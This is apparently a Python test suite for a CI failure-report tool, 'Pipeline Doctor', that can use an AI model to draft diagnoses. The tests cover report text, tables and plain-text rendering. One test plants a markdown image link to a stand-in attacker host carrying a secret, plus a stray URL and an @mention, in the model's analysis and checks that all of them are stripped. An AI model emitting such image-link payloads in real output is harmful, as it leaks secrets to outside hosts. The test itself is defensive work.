from doctor import informe
from doctor.diff import comparar
from doctor.sospechosos import generar

LOG = "E   AttributeError: module 'fechautil' has no attribute 'parse'"


def hue(version, ref):
    return {
        "dependencias": {"fechautil": version},
        "referencias": {"fechautil": f"git+https://github.com/x/fechautil.git@{ref}"},
        "herramientas": {},
        "runner": {"imagen_version": "20260928.1"},
        "archivos": {},
    }


def ctx_base(**extra):
    diff = comparar(hue("1.0.0", "a" * 40), hue("1.1.0", "b" * 40))
    ctx = {
        "run_id": "999",
        "run_number": "57",
        "run_url": "https://github.com/x/y/actions/runs/999",
        "job": "test",
        "paso": "Correr tests",
        "linea_error": "AttributeError: module 'fechautil' has no attribute 'parse'",
        "verde": {"run_number": "56", "timestamp": "2026-10-04T12:00:00Z", "sha": "s1"},
        "huella_actual": True,
        "diff": diff,
        "codigo": {"identico": True, "archivos": []},
        "redacciones": 0,
        "modelo": None,
        "ia_error": None,
    }
    ctx.update(extra)
    ctx["sospechosos"] = generar(ctx["diff"], LOG, (ctx["codigo"] or {}).get("archivos"))
    return ctx


def test_informe_sin_ia_cuenta_la_historia_completa():
    md = informe.construir(ctx_base())
    assert "Pipeline Doctor: consulta del run #57" in md
    assert "**Tu código no cambió**" in md
    assert "| Dependencia `fechautil` | `1.0.0` | `1.1.0` |" in md
    assert "fechautil==1.0.0" in md
    assert "Modo sin IA" in md
    assert "**Confianza:** alta" in md


def test_informe_usa_el_analisis_del_modelo_y_lo_sanea():
    analisis = {
        "sintomas": "Falla `parse`.",
        "diagnostico": "Cambió la API. Mira ![x](https://evil.example/?d=secreto) y @alguien http://otra.url/x",
        "descartado": ["runner: misma imagen"],
        "tratamiento": "Fija 1.0.0.",
        "validacion": "Debe pasar.",
        "confianza": "ALTA",
    }
    md = informe.construir(ctx_base(modelo="amazon.nova-lite-v1:0"), analisis)
    assert "evil.example" not in md and "otra.url" not in md
    assert "@alguien" not in md  # la mención queda neutralizada
    # con comparación disponible, los descartes los pone el código, no el modelo
    assert "Cambio del runner: misma imagen en ambos runs" in md
    assert "Cambio de código: mismo commit" in md
    assert "runner: misma imagen." not in md
    assert "**Confianza:** alta" in md
    assert "Modo sin IA" not in md


def test_informe_con_error_de_ia_lo_avisa():
    md = informe.construir(ctx_base(modelo="m", ia_error="boom"))
    assert "No pude consultar el modelo" in md


def test_sin_verde_explica_que_no_puede_comparar():
    ctx = ctx_base(verde=None, diff=None, codigo=None)
    md = informe.construir(ctx)
    assert "Todavía no hay un run verde" in md


def test_sin_huella_sugiere_el_paso_huella():
    ctx = ctx_base(verde=None, diff=None, codigo=None, huella_actual=False)
    assert "huella" in informe.construir(ctx)


def test_codigo_cambiado_lista_archivos():
    ctx = ctx_base(codigo={"identico": False, "archivos": ["a.py", "b.py"]}, diff=comparar(hue("1", "a"), hue("1", "a")))
    md = informe.construir(ctx)
    assert "cambiaron 2 archivo(s)" in md and "`a.py`" in md
    assert "No encontré diferencias" in md


def test_tabla_se_recorta():
    deps_a = {f"p{i}": "1" for i in range(30)}
    deps_b = {f"p{i}": "2" for i in range(30)}
    base = {"referencias": {}, "herramientas": {}, "runner": {}, "archivos": {}}
    diff = comparar({**base, "dependencias": deps_a}, {**base, "dependencias": deps_b})
    tabla = informe.tabla_cambios(diff, 1, 2)
    assert "y 18 cambio(s) más" in tabla


def test_envolver_incluye_el_marcador():
    assert informe.envolver(["a", "b"]).startswith(informe.MARCADOR)


def test_texto_plano_para_el_log():
    md = informe.envolver([informe.construir(ctx_base())])
    plano = informe.texto_plano(md)
    assert "**" not in plano and "`" not in plano and "<sub>" not in plano
    assert informe.MARCADOR not in plano
    assert "QUÉ CAMBIÓ EN EL ENTORNO" in plano
    # la tabla queda alineada y sin la fila separadora de Markdown
    assert "|---" not in plano
    fila = next(l for l in plano.splitlines() if l.strip().startswith("Dependencia fechautil"))
    assert "1.0.0" in fila and "1.1.0" in fila


def test_linea_de_error_va_en_bloque_de_codigo():
    md = informe.construir(ctx_base(linea_error="E   AttributeError: ``` raro"))
    assert md.count("```") == 2  # el bloque se abre y se cierra una sola vez


def test_descartado_no_duplica_puntos():
    analisis = {"descartado": ["Cambios en el código.", "Otro módulo."]}
    md = informe.construir(ctx_base(verde=None, diff=None, codigo=None, modelo="m"), analisis)
    assert "**Descartado:**\n\n- Cambios en el código\n- Otro módulo\n" in md + "\n"
    assert ".;" not in md and ".." not in md.split("**Descartado:**")[1].splitlines()[0]


def test_con_ia_se_aclara_que_el_texto_lo_redacto_un_modelo():
    md = informe.construir(ctx_base(modelo="amazon.nova-lite-v1:0"), {"diagnostico": "x"})
    assert "Texto redactado con IA (`amazon.nova-lite-v1:0` en Amazon Bedrock)" in md
    assert "Modo sin IA" not in md


def test_sin_ia_no_dice_que_hubo_ia():
    md = informe.construir(ctx_base())
    assert "redactado con IA" not in md


def test_si_la_ia_fallo_no_dice_que_la_redacto():
    md = informe.construir(ctx_base(modelo="m", ia_error="boom"))
    assert "redactado con IA" not in md and "No pude consultar el modelo" in md


def test_descartes_nunca_incluyen_lo_que_si_cambio():
    md = informe.construir(ctx_base())
    linea = md.split("**Descartado:**")[1].split("####")[0].split("---")[0]
    assert "Cambio de dependencias" not in linea  # fechautil sí cambió
    assert "Cambio del origen de las dependencias" not in linea  # su commit también


def test_sin_comparacion_se_usa_el_descartado_del_modelo():
    md = informe.construir(ctx_base(verde=None, diff=None, codigo=None, modelo="m"), {"descartado": ["Red: sin cambios."]})
    assert "**Descartado:**\n\n- Red: sin cambios" in md


def test_descartado_va_en_lista_y_el_log_la_muestra_con_vinetas():
    md = informe.construir(ctx_base())
    assert "**Descartado:**\n\n- Cambio de código: mismo commit\n- Cambio del runner" in md
    plano = informe.texto_plano(md)
    assert "  • Cambio del runner: misma imagen en ambos runs" in plano
